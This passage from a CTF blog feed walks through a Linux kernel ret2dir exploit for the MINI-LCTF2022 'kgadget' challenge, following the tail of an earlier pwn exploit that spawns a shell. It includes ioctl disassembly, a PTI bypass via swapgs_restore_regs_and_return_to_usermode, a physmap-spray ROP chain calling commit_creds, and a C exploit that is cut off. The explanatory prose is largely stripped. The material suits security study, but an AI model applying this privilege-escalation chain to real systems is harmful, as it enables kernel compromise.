class="string">b&#x27;@&#x27;</span>+p32(<span class="number">0x7fc4cf08c968</span>-<span class="number">0x7fc4ced75010</span>)+write(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">        code+=<span class="string">b&#x27;@&#x27;</span>+p32(<span class="number">0x7fc4cf08cf60</span>-<span class="number">0x7fc4cf08c968</span>)+write(p32(<span class="number">0xb6e290</span>)[<span class="number">0</span>:<span class="number">3</span>])+<span class="string">b&#x27;q&#x27;</span></span><br><span class="line">        sla(<span class="string">b&#x27;code&#x27;</span>,code)</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line">        sl(<span class="string">b&#x27;cat /flag&#x27;</span>)</span><br><span class="line">        io.interactive()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        io.close()</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><strong>exit<a href="https://www.anquanke.com/post/id/243196">https://www.anquanke.com/post/id/243196</a></strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kernel Ret2dir</title>
      <link href="/2023/08/22/kernel-ret2dir/"/>
      <url>/2023/08/22/kernel-ret2dir/</url>
      
        <content type="html"><![CDATA[<h1 id="return-to-direct-mapped-memory"><a href="#return-to-direct-mapped-memory" class="headerlink" title="return to direct-mapped memory"></a>return to direct-mapped memory</h1><p>smep smap</p><p>linux x86 <a href="https://elixir.bootlin.com/linux/v5.19.17/source/Documentation/x86/x86_64/mm.rst">https://elixir.bootlin.com/linux/v5.19.17/source/Documentation/x86/x86_64/mm.rst</a></p><p>direct mapping of all physical memory<strong></strong><strong>physmap</strong></p><p><img src="/2023/08/22/kernel-ret2dir/image-20230820153202390.png" alt="image-20230820153202390"></p><p><img src="/2023/08/22/kernel-ret2dir/image-20230820102303460.png" alt="image-20230820102303460"></p><p>Linuxx86-64(484)payloadrop</p><p><img src="/2023/08/22/kernel-ret2dir/image-20230820154114405.png" alt="image-20230820154114405"></p><h2 id="MINI-LCTF2022-kgadget"><a href="#MINI-LCTF2022-kgadget" class="headerlink" title="MINI-LCTF2022 - kgadget"></a><a href="https://arttnba3.cn/download/minil2022/pwn/kgadget.tar.xz">MINI-LCTF2022 - kgadget</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/k/kgadget&gt; file bzImage</span><br><span class="line">bzImage: Linux kernel x86 boot executable bzImage, version 5.10.112 (arttnba3@ubuntu) #1 SMP Thu Apr 21 19:47:35 +08 2022, RO-rootFS, swap_dev 0X9, Normal VGA</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/k/k/rootfs&gt; cpio -idmv &lt; rootfs.cpio</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/k/kgadget&gt; checksec kgadget.ko</span><br><span class="line">[*] &#x27;/home/grxer/kernel-env/kgadget/kgadget.ko&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure><p>initdemsg&#x2F;proc&#x2F;kallsystem</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt;/proc/sys/kernel/dmesg_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt;/proc/sys/kernel/kptr_restrict</span><br></pre></td></tr></table></figure><p>run.shsmep smap kptikaslrvmlinuxgadget</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-cpu kvm64,+smep,+smap \</span><br><span class="line">-append &quot;console=ttyS0 nokaslr pti=on quiet oops=panic panic=1&quot; \</span><br></pre></td></tr></table></figure><p>vmlinuxbzImage,</p><ul><li>extract-vmlinux ps</li><li>vmlinux-to-elf</li></ul><p>file_operations</p><p><img src="/2023/08/22/kernel-ret2dir/image-20230820170432061.png" alt="image-20230820170432061"></p><p>ioctl</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">text.unlikely:<span class="number">00000000000000F</span>3                               ; __int64 __fastcall <span class="title function_">kgadget_ioctl</span><span class="params">(file *__file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> __int64 param)</span></span><br><span class="line">.text.unlikely:00000000000000F3                               kgadget_ioctl proc near                 ; DATA XREF: __mcount_loc:<span class="number">0000000000000653</span>o</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>3                                                                       ; .data:kgadget_foo</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>3</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>3                               regs_addr= qword ptr <span class="number">-20</span>h</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>3</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>3                               __file = rdi                            ; file *</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>3                               cmd = rsi                               ; <span class="type">unsigned</span> <span class="type">int</span></span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>3                               param = rdx                             ; <span class="type">unsigned</span> __int64</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>3 E8 <span class="number">40</span> <span class="number">0F</span> <span class="number">00</span> <span class="number">00</span>                call    __fentry__                      ; PIC mode</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>3</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>8 <span class="number">55</span>                            push    rbp</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>9 <span class="number">48</span> <span class="number">89</span> E5                      mov     rbp, rsp</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>C <span class="number">53</span>                            push    rbx</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>D <span class="number">48</span> <span class="number">83</span> EC <span class="number">10</span>                   sub     rsp, <span class="number">10</span>h</span><br><span class="line">.text.unlikely:<span class="number">0000000000000101</span> <span class="number">65</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">04</span> <span class="number">25</span> <span class="number">28</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov     rax, gs:<span class="number">28</span>h</span><br><span class="line">.text.unlikely:<span class="number">000000000000010</span>A <span class="number">48</span> <span class="number">89</span> <span class="number">45</span> F0                   mov     [rbp<span class="number">-10</span>h], rax</span><br><span class="line">.text.unlikely:<span class="number">000000000000010</span>E <span class="number">31</span> C0                         xor     eax, eax</span><br><span class="line">.text.unlikely:<span class="number">0000000000000110</span> <span class="number">81</span> FE <span class="number">52</span> BF <span class="number">01</span> <span class="number">00</span>             cmp     esi, <span class="number">1B</span>F52h</span><br><span class="line">.text.unlikely:<span class="number">0000000000000116</span> <span class="number">0F</span> <span class="number">85</span> <span class="number">87</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>             jnz     loc_1A3</span><br><span class="line">.text.unlikely:<span class="number">0000000000000116</span></span><br><span class="line">.text.unlikely:<span class="number">000000000000011</span>C <span class="number">48</span> <span class="number">8B</span> <span class="number">1</span>A                      mov     rbx, [param]</span><br><span class="line">.text.unlikely:<span class="number">000000000000011F</span>                               kgadget_ptr = rbx                       ; <span class="type">void</span> (*)(<span class="type">void</span>)</span><br><span class="line">.text.unlikely:<span class="number">000000000000011F</span> <span class="number">48</span> C7 C7 <span class="number">70</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>          mov     __file, offset unk_370</span><br><span class="line">.text.unlikely:<span class="number">0000000000000126</span> <span class="number">48</span> <span class="number">89</span> DE                      mov     cmd, kgadget_ptr</span><br><span class="line">.text.unlikely:<span class="number">0000000000000129</span> E8 <span class="number">2</span>A <span class="number">0F</span> <span class="number">00</span> <span class="number">00</span>                call    printk                          ; PIC mode</span><br><span class="line">.text.unlikely:<span class="number">0000000000000129</span></span><br><span class="line">.text.unlikely:<span class="number">000000000000012</span>E <span class="number">48</span> C7 C7 A0 <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>          mov     rdi, offset unk_3A0</span><br><span class="line">.text.unlikely:<span class="number">0000000000000135</span> E8 <span class="number">1</span>E <span class="number">0F</span> <span class="number">00</span> <span class="number">00</span>                call    printk                          ; PIC mode</span><br><span class="line">.text.unlikely:<span class="number">0000000000000135</span></span><br><span class="line">.text.unlikely:<span class="number">000000000000013</span>A <span class="number">48</span> <span class="number">89</span> <span class="number">65</span> E8                   mov     [rbp<span class="number">-18</span>h], rsp</span><br><span class="line">.text.unlikely:<span class="number">000000000000013</span>E <span class="number">48</span> <span class="number">8B</span> <span class="number">45</span> E8                   mov     rax, [rbp<span class="number">-18</span>h]</span><br><span class="line">.text.unlikely:<span class="number">0000000000000142</span> <span class="number">48</span> C7 C7 F8 <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>          mov     rdi, offset unk_3F8</span><br><span class="line">.text.unlikely:<span class="number">0000000000000149</span> <span class="number">48</span> <span class="number">05</span> <span class="number">00</span> <span class="number">10</span> <span class="number">00</span> <span class="number">00</span>             add     rax, <span class="number">1000</span>h</span><br><span class="line">.text.unlikely:<span class="number">000000000000014F</span> <span class="number">48</span> <span class="number">25</span> <span class="number">00</span> F0 FF FF             and     rax, <span class="number">0F</span>FFFFFFFFFFFF000h</span><br><span class="line">.text.unlikely:<span class="number">0000000000000155</span> <span class="number">48</span> <span class="number">8</span>D <span class="number">90</span> <span class="number">58</span> FF FF FF          lea     rdx, [rax<span class="number">-0</span>A8h]</span><br><span class="line">.text.unlikely:<span class="number">000000000000015</span>C <span class="number">48</span> <span class="number">89</span> <span class="number">55</span> E8                   mov     [rbp<span class="number">-18</span>h], rdx</span><br><span class="line">.text.unlikely:<span class="number">0000000000000160</span>                               regs = rdx                              ; pt_regs *</span><br><span class="line">.text.unlikely:<span class="number">0000000000000160</span> <span class="number">48</span> BA <span class="number">61</span> <span class="number">72</span> <span class="number">74</span> <span class="number">74</span> <span class="number">6</span>E <span class="number">62</span> <span class="number">61</span> <span class="number">33</span> mov     regs, <span class="string">&#x27;3abnttra&#x27;</span></span><br><span class="line">.text.unlikely:<span class="number">000000000000016</span>A <span class="number">48</span> <span class="number">89</span> <span class="number">90</span> <span class="number">58</span> FF FF FF          mov     [rax<span class="number">-0</span>A8h], rdx</span><br><span class="line">.text.unlikely:<span class="number">0000000000000171</span> <span class="number">48</span> <span class="number">89</span> <span class="number">90</span> <span class="number">60</span> FF FF FF          mov     [rax<span class="number">-0</span>A0h], rdx</span><br><span class="line">.text.unlikely:<span class="number">0000000000000178</span> <span class="number">48</span> <span class="number">89</span> <span class="number">90</span> <span class="number">68</span> FF FF FF          mov     [rax<span class="number">-98</span>h], rdx</span><br><span class="line">.text.unlikely:<span class="number">000000000000017F</span> <span class="number">48</span> <span class="number">89</span> <span class="number">90</span> <span class="number">70</span> FF FF FF          mov     [rax<span class="number">-90</span>h], rdx</span><br><span class="line">.text.unlikely:<span class="number">0000000000000186</span> <span class="number">48</span> <span class="number">89</span> <span class="number">90</span> <span class="number">78</span> FF FF FF          mov     [rax<span class="number">-88</span>h], rdx</span><br><span class="line">.text.unlikely:<span class="number">000000000000018</span>D <span class="number">48</span> <span class="number">89</span> <span class="number">50</span> <span class="number">80</span>                   mov     [rax<span class="number">-80</span>h], rdx</span><br><span class="line">.text.unlikely:<span class="number">0000000000000191</span> <span class="number">48</span> <span class="number">89</span> <span class="number">50</span> <span class="number">90</span>                   mov     [rax<span class="number">-70</span>h], rdx</span><br><span class="line">.text.unlikely:<span class="number">0000000000000195</span> E8 BE <span class="number">0</span>E <span class="number">00</span> <span class="number">00</span>                call    printk                          ; PIC mode</span><br><span class="line">.text.unlikely:<span class="number">0000000000000195</span></span><br><span class="line">.text.unlikely:<span class="number">000000000000019</span>A E8 B1 <span class="number">0</span>E <span class="number">00</span> <span class="number">00</span>                call    __x86_indirect_thunk_rbx        ; PIC mode</span><br></pre></td></tr></table></figure><p>ioctlropmmapgadget</p><blockquote><p>mmapgdbfind</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find 0xffff888000000000,+0x10000000,&quot;target strings&quot;</span><br></pre></td></tr></table></figure></blockquote><p>?</p><p><strong>kpitsyscall(pitcr3)</strong></p><p>syscallsyscallriprcxrflags r11entry_SYSCALL_64 </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ENTRY(entry_SYSCALL_64)</span><br><span class="line"> <span class="comment">/* SWAPGS_UNSAFE_STACKx86swapgs */</span></span><br><span class="line"> SWAPGS_UNSAFE_STACK</span><br><span class="line"></span><br><span class="line"> <span class="comment">/*  */</span></span><br><span class="line"> movq %rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class="line"> movq <span class="title function_">PER_CPU_VAR</span><span class="params">(cpu_current_top_of_stack)</span>, %rsp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pushpt_regs */</span></span><br><span class="line"><span class="comment">/* Construct struct pt_regs on stack */</span></span><br><span class="line">pushq  $__USER_DS      <span class="comment">/* pt_regs-&gt;ss */</span></span><br><span class="line">pushq  <span class="title function_">PER_CPU_VAR</span><span class="params">(rsp_scratch)</span>  <span class="comment">/* pt_regs-&gt;sp */</span></span><br><span class="line">pushq  %r11             <span class="comment">/* pt_regs-&gt;flags */</span></span><br><span class="line">pushq  $__USER_CS      <span class="comment">/* pt_regs-&gt;cs */</span></span><br><span class="line">pushq  %rcx             <span class="comment">/* pt_regs-&gt;ip */</span></span><br><span class="line">pushq  %rax             <span class="comment">/* pt_regs-&gt;orig_ax */</span></span><br><span class="line">pushq  %rdi             <span class="comment">/* pt_regs-&gt;di */</span></span><br><span class="line">pushq  %rsi             <span class="comment">/* pt_regs-&gt;si */</span></span><br><span class="line">pushq  %rdx             <span class="comment">/* pt_regs-&gt;dx */</span></span><br><span class="line">pushq  %rcx tuichu    <span class="comment">/* pt_regs-&gt;cx */</span></span><br><span class="line">pushq  $-ENOSYS        <span class="comment">/* pt_regs-&gt;ax */</span></span><br><span class="line">pushq  %r8              <span class="comment">/* pt_regs-&gt;r8 */</span></span><br><span class="line">pushq  %r9              <span class="comment">/* pt_regs-&gt;r9 */</span></span><br><span class="line">pushq  %r10             <span class="comment">/* pt_regs-&gt;r10 */</span></span><br><span class="line">pushq  %r11             <span class="comment">/* pt_regs-&gt;r11 */</span></span><br><span class="line">sub $<span class="params">(<span class="number">6</span>*<span class="number">8</span>)</span>, %rsp      <span class="comment">/* pt_regs-&gt;bp, bx, r12-15 not saved */</span></span><br><span class="line">.......</span><br></pre></td></tr></table></figure><p>pushpt_regs</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* arch/x86/include/asm/ptrace.h */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> r15;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> r14;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> r13;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> r12;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> rbp;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> r11;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> r10;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> r9;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> r8;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> rax;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> rcx;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> rdx;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> rsi;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> rip;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> cs;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> rsp;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>add rsp,val,retpop rspret</code></p><p>r8r9</p><p><code>add rsp,val,ret</code>r9r9<code>pop rsp,ret</code>gadget<code>pop rsp</code>r8,retr8physmap</p><p> call __x86_indirect_thunk_rbxret</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__asm__(</span><br><span class="line">    &quot;mov r15,   0xbeefdead;&quot;</span><br><span class="line">    &quot;mov r14,   0x11111111;&quot;</span><br><span class="line">    &quot;mov r13,   0x22222222;&quot;</span><br><span class="line">    &quot;mov r12,   0x33333333;&quot;</span><br><span class="line">    &quot;mov rbp,   0x44444444;&quot;</span><br><span class="line">    &quot;mov rbx,   0x55555555;&quot;</span><br><span class="line">    &quot;mov r11,   0x66666666;&quot;</span><br><span class="line">    &quot;mov r10,   0x77777777;&quot;</span><br><span class="line">    &quot;mov r9,    0x999999999;&quot;   </span><br><span class="line">    &quot;mov r8,    0x888888888;&quot;</span><br><span class="line">    &quot;mov rax,   0x10;&quot;</span><br><span class="line">    &quot;mov rcx,   0xaaaaaaaa;&quot;</span><br><span class="line">    &quot;mov rdx,   0x33;&quot;</span><br><span class="line">    &quot;mov rsi,   0x1bf52;&quot;</span><br><span class="line">    &quot;mov rdi,   fd;&quot;</span><br><span class="line">    &quot;syscall&quot;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><blockquote><p>__x86_indirect_thunk_rbx</p><p><img src="/2023/08/22/kernel-ret2dir/image-20230823153602727.png" alt="image-20230823153602727"></p></blockquote><p><img src="/2023/08/22/kernel-ret2dir/image-20230823153135353.png" alt="image-20230823153135353"></p><p>add rsp, 0xc0gadget</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0xffffffff810737fe: add rsp, 0xa0; pop rbx; pop r12; pop r13; pop rbp; ret;</span><br></pre></td></tr></table></figure><p>ptirootshellcr3</p><p>PGDPGD8KB8KCR3CR313()CR3</p><p><img src="/2023/08/22/kernel-ret2dir/image-20230823181758556.png" alt="image-20230823181758556"></p><p>131</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;SWITCH_USER_CR3</span><br><span class="line">mov     rdi, cr3</span><br><span class="line">or      rdi, 1000h</span><br><span class="line">mov     cr3, rdi</span><br></pre></td></tr></table></figure><p>gadget</p><p>kaslrswapgs_restore_regs_and_return_to_usermode,vmlinuxvmlinux</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; disassemble swapgs_restore_regs_and_return_to_usermode                                                                                                                                                </span><br><span class="line">Dump of assembler code for function swapgs_restore_regs_and_return_to_usermode:    </span><br><span class="line">0xffffffff81c00fb0 &lt;+0&gt;:     nop    DWORD PTR [rax+rax*1+0x0] </span><br><span class="line">0xffffffff81c00fb5 &lt;+5&gt;:     pop    r15                    </span><br><span class="line">0xffffffff81c00fb7 &lt;+7&gt;:     pop    r14 </span><br><span class="line">0xffffffff81c00fb9 &lt;+9&gt;:     pop    r13     </span><br><span class="line">0xffffffff81c00fbb &lt;+11&gt;:    pop    r12</span><br><span class="line">0xffffffff81c00fbd &lt;+13&gt;:    pop    rbp</span><br><span class="line">0xffffffff81c00fbe &lt;+14&gt;:    pop    rbx</span><br><span class="line">0xffffffff81c00fbf &lt;+15&gt;:    pop    r11</span><br><span class="line">0xffffffff81c00fc1 &lt;+17&gt;:    pop    r10</span><br><span class="line">0xffffffff81c00fc3 &lt;+19&gt;:    pop    r9</span><br><span class="line">0xffffffff81c00fc5 &lt;+21&gt;:    pop    r8</span><br><span class="line">0xffffffff81c00fc7 &lt;+23&gt;:    pop    rax</span><br><span class="line">0xffffffff81c00fc8 &lt;+24&gt;:    pop    rcx</span><br><span class="line">0xffffffff81c00fc9 &lt;+25&gt;:    pop    rdx</span><br><span class="line">0xffffffff81c00fca &lt;+26&gt;:    pop    rsi;pt_regs</span><br><span class="line">0xffffffff81c00fcb &lt;+27&gt;:    mov    rdi,rsp;shllrop</span><br><span class="line">0xffffffff81c00fce &lt;+30&gt;:    mov    rsp,QWORD PTR gs:0x6004</span><br><span class="line">0xffffffff81c00fd7 &lt;+39&gt;:    push   QWORD PTR [rdi+0x30]</span><br><span class="line">0xffffffff81c00fda &lt;+42&gt;:    push   QWORD PTR [rdi+0x28]</span><br><span class="line">0xffffffff81c00fdd &lt;+45&gt;:    push   QWORD PTR [rdi+0x20]</span><br><span class="line">0xffffffff81c00fe0 &lt;+48&gt;:    push   QWORD PTR [rdi+0x18]</span><br><span class="line">0xffffffff81c00fe3 &lt;+51&gt;:    push   QWORD PTR [rdi+0x10]</span><br><span class="line">0xffffffff81c00fe6 &lt;+54&gt;:    push   QWORD PTR [rdi]</span><br><span class="line">0xffffffff81c00fe8 &lt;+56&gt;:    push   rax</span><br><span class="line">0xffffffff81c00fe9 &lt;+57&gt;:    xchg   ax,ax</span><br><span class="line">0xffffffff81c00feb &lt;+59&gt;:    mov    rdi,cr3</span><br><span class="line">0xffffffff81c00fee &lt;+62&gt;:    jmp    0xffffffff81c01024 &lt;swapgs_restore_regs_and_return_to_usermode+116&gt;</span><br><span class="line">......</span><br><span class="line">0xffffffff81c01024 &lt;swapgs_restore_regs_and_return_to_usermode+116&gt;: or     rdi,0x1000;PGD</span><br><span class="line">0xffffffff81c0102b &lt;swapgs_restore_regs_and_return_to_usermode+123&gt;: mov    cr3,rdi</span><br><span class="line">0xffffffff81c0102e &lt;swapgs_restore_regs_and_return_to_usermode+126&gt;: pop    rax</span><br><span class="line">0xffffffff81c0102f &lt;swapgs_restore_regs_and_return_to_usermode+127&gt;: pop    rdi</span><br><span class="line">0xffffffff81c01030 &lt;swapgs_restore_regs_and_return_to_usermode+128&gt;: swapgs </span><br><span class="line">0xffffffff81c01033 &lt;swapgs_restore_regs_and_return_to_usermode+131&gt;: jmp    0xffffffff81c01060 &lt;native_iret&gt;</span><br><span class="line">......</span><br><span class="line">0xffffffff81c01060 &lt;native_iret&gt;:    test   BYTE PTR [rsp+0x20],0x4;</span><br><span class="line">0xffffffff81c01065 &lt;native_iret+5&gt;:  jne    0xffffffff81c01069 &lt;native_irq_return_ldt&gt;</span><br><span class="line">0xffffffff81c01067 &lt;native_irq_return_iret&gt;: iretq</span><br></pre></td></tr></table></figure><p>gspopraxrdirop</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">rsp  ----&gt;  swapgs_restore_regs_and_return_to_usermode::mov_rdi_rsp</span><br><span class="line">            <span class="number">0</span></span><br><span class="line">            <span class="number">0</span></span><br><span class="line">            get root shell</span><br><span class="line">            cs</span><br><span class="line">            rflags</span><br><span class="line">            rsp</span><br><span class="line">            ss</span><br></pre></td></tr></table></figure><p>physmap</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">------------------------</span><br><span class="line">add rsp, val ; ret </span><br><span class="line">add rsp, val ; ret </span><br><span class="line">add rsp, val ; ret </span><br><span class="line">add rsp, val ; ret</span><br><span class="line">...</span><br><span class="line">add rsp, val ; ret # gadgetret rop </span><br><span class="line">------------------------</span><br><span class="line">ret</span><br><span class="line">ret</span><br><span class="line">...</span><br><span class="line">ret</span><br><span class="line">------------------------</span><br><span class="line">common root ROP chain</span><br><span class="line">------------------------</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">size_t</span> page_size;</span><br><span class="line"><span class="type">size_t</span> pop_rsp_ret = <span class="number">0xffffffff811483d0</span>;</span><br><span class="line"><span class="type">size_t</span> add_rsp_0xc0 = <span class="number">0xffffffff810737fe</span>;</span><br><span class="line"><span class="type">size_t</span> ret = <span class="number">0xffffffff8108c6f1</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff8108c6f0</span>;</span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff810c9540</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff810c92e0</span>;</span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xffffffff82a6b700</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs = <span class="number">0xffffffff81c0129c</span>;</span><br><span class="line"><span class="type">size_t</span> iret_poprbp = <span class="number">0xffffffff8103ba65</span>;</span><br><span class="line"><span class="type">size_t</span> guess;</span><br><span class="line"><span class="type">size_t</span> *physmap_spray_arr[<span class="number">16000</span>];</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00fb0</span> + <span class="number">27</span>;</span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!getuid()) &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">  __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">          <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">          <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">constructROPChain</span><span class="params">(<span class="type">size_t</span> *rop)</span> &#123;</span><br><span class="line">  <span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (; idx &lt; (page_size / <span class="number">8</span> - <span class="number">0x30</span>); idx++)</span><br><span class="line">    rop[idx] = add_rsp_0xc0;</span><br><span class="line">  <span class="keyword">for</span> (; idx &lt; (page_size / <span class="number">8</span> - <span class="number">0x10</span>); idx++)</span><br><span class="line">    rop[idx] = ret;</span><br><span class="line">  rop[idx++] = pop_rdi_ret;</span><br><span class="line">  rop[idx++] = init_cred;</span><br><span class="line">  rop[idx++] = commit_creds;</span><br><span class="line">  rop[idx++] = swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line">  rop[idx++] = <span class="number">0</span>;</span><br><span class="line">  rop[idx++] = <span class="number">0</span>;</span><br><span class="line">  rop[idx++] = (<span class="type">size_t</span>)spawn_shell;</span><br><span class="line">  rop[idx++] = user_cs;</span><br><span class="line">  rop[idx++] = user_rflags;</span><br><span class="line">  rop[idx++] = user_sp;</span><br><span class="line">  rop[idx++] = user_ss;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  save_status();</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/kgadget&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> 